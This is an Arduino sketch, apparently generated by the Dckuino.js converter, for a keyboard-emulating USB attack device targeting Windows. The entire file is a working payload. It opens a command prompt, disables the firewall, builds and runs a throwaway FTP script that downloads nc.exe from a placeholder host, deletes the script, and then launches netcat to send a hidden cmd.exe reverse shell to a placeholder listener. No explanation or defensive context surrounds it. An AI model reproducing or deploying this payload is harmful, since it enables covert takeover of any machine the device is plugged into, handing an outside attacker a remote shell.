/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(10000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(600);

  Keyboard.print("cd %USERPROFILE%");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh firewall set opmode disable");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("echo open [IP] [PORT] > ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo [USERNAME]>> ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo [PASSWORD]>> ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo bin >> ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo get nc.exe >> ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo bye >> ftp.txt");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("ftp -s:ftp.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("del ftp.txt & exit");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(600);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
